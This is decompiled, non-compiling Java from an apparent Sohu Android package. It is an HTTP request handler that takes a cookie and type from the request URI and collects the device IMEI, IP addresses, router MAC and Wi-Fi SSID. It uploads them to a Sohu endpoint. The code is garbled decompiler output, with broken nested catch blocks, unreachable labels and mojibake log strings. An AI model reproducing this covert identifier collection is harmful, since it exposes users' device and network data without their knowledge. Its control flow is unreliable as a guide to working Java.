package com.sohu.httpserver;

import com.sohu.upload.b.c;
import com.sohu.upload.b.d;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import org.apache.http.HttpRequest;
import org.apache.http.HttpResponse;
import org.apache.http.MethodNotSupportedException;
import org.apache.http.RequestLine;
import org.apache.http.protocol.HttpContext;
import org.apache.http.protocol.HttpRequestHandler;
import org.json.JSONException;
import org.json.JSONObject;

class b
  implements HttpRequestHandler
{
  public void handle(HttpRequest paramHttpRequest, HttpResponse paramHttpResponse, HttpContext paramHttpContext)
  {
    String str1 = paramHttpRequest.getRequestLine().getMethod().toUpperCase(Locale.ENGLISH);
    Map localMap = c.b(paramHttpRequest.getRequestLine().getUri());
    JSONObject localJSONObject = new JSONObject();
    try
    {
      if (localMap.get("cookie") != null)
      {
        localJSONObject.put("cookie", localMap.get("cookie"));
        if (localMap.get("type") == null)
          break label558;
        localJSONObject.put("type", localMap.get("type"));
      }
    }
    catch (JSONException localJSONException7)
    {
      try
      {
        label102: localJSONObject.put("imei", c.d());
      }
      catch (JSONException localJSONException7)
      {
        try
        {
          label113: localJSONObject.put("visitor_ip", HttpServer.a());
        }
        catch (JSONException localJSONException7)
        {
          try
          {
            label124: localJSONObject.put("route_mac", c.i());
          }
          catch (JSONException localJSONException7)
          {
            try
            {
              label135: localJSONObject.put("route_ssid", c.h());
            }
            catch (JSONException localJSONException7)
            {
              try
              {
                label146: localJSONObject.put("pkgid", c.b);
              }
              catch (JSONException localJSONException7)
              {
                try
                {
                  label157: localJSONObject.put("timetag", System.currentTimeMillis() + "");
                  label186: String str2 = "";
                  if (localJSONObject != null)
                    str2 = c.c(localJSONObject.toString());
                  localHashMap = new HashMap();
                  localHashMap.put("content", str2);
                }
                catch (JSONException localJSONException7)
                {
                  try
                  {
                    HashMap localHashMap;
                    if (c.l())
                    {
                      if (!com.sohu.upload.b.a.a("http://hui.sohu.com/mum/ippost", localHashMap))
                        break label757;
                      StringBuilder localStringBuilder = new StringBuilder();
                      localStringBuilder.append("cookie=");
                      if (localMap.get("cookie") != null)
                        localStringBuilder.append((String)localMap.get("cookie"));
                      localStringBuilder.append("&type=");
                      if (localMap.get("type") != null)
                        localStringBuilder.append((String)localMap.get("type"));
                      localStringBuilder.append("&imei=");
                      localStringBuilder.append(c.d());
                      localStringBuilder.append("&visitor_ip=");
                      localStringBuilder.append(HttpServer.a());
                      localStringBuilder.append("&local_ip=");
                      localStringBuilder.append(c.n());
                      localStringBuilder.append("&route_mac=");
                      localStringBuilder.append(c.i());
                      localStringBuilder.append("&route_ssid=");
                      localStringBuilder.append(c.h());
                      localStringBuilder.append("&pkgid=");
                      localStringBuilder.append(c.b);
                      localStringBuilder.append("&timetag=");
                      localStringBuilder.append(System.currentTimeMillis() + "");
                      new d(HttpServer.b(), "http://hui.sohu.com/mum/ippost?" + localStringBuilder.toString()).start();
                      com.sohu.upload.a.a.a("��ɲ����ɹ�");
                    }
                    while (true)
                    {
                      if (!str1.equals("GET"))
                        break label801;
                      return;
                      localJSONObject.put("cookie", "");
                      break;
                      localJSONException1 = localJSONException1;
                      com.sohu.upload.a.a.b("ƴ��JSON���ֵ��쳣:" + localJSONException1.getMessage());
                      break label102;
                      label558: localJSONObject.put("type", "");
                      break label102;
                      localJSONException2 = localJSONException2;
                      com.sohu.upload.a.a.b("ƴ��JSON���ֵ��쳣:" + localJSONException2.getMessage());
                      break label113;
                      localJSONException3 = localJSONException3;
                      com.sohu.upload.a.a.b("ƴ��JSON���ֵ��쳣:" + localJSONException3.getMessage());
                      break label124;
                      localJSONException4 = localJSONException4;
                      com.sohu.upload.a.a.b("ƴ��JSON���ֵ��쳣:" + localJSONException4.getMessage());
                      break label135;
                      localJSONException5 = localJSONException5;
                      com.sohu.upload.a.a.b("ƴ��JSON���ֵ��쳣:" + localJSONException5.getMessage());
                      break label146;
                      localJSONException6 = localJSONException6;
                      com.sohu.upload.a.a.b("ƴ��JSON���ֵ��쳣:" + localJSONException6.getMessage());
                      break label157;
                      localJSONException7 = localJSONException7;
                      com.sohu.upload.a.a.b("ƴ��JSON���ֵ��쳣:" + localJSONException7.getMessage());
                      break label186;
                      label757: com.sohu.upload.a.a.b("��ɲ���ʧ��");
                    }
                  }
                  catch (Exception localException)
                  {
                    label801: 
                    do
                      while (true)
                        com.sohu.upload.a.a.b("�쳣:" + localException.getMessage() + "��ɲ���ʧ��");
                    while (str1.equals("POST"));
                  }
                }
              }
            }
          }
        }
      }
    }
    throw new MethodNotSupportedException(str1 + " method not supported");
  }
}

/* Location:           C:\Users\THX\Desktop\aa\aa\反编译工具包\out\classes_dex2jar.jar
 * Qualified Name:     com.sohu.httpserver.b
 * JD-Core Version:    0.6.2
 */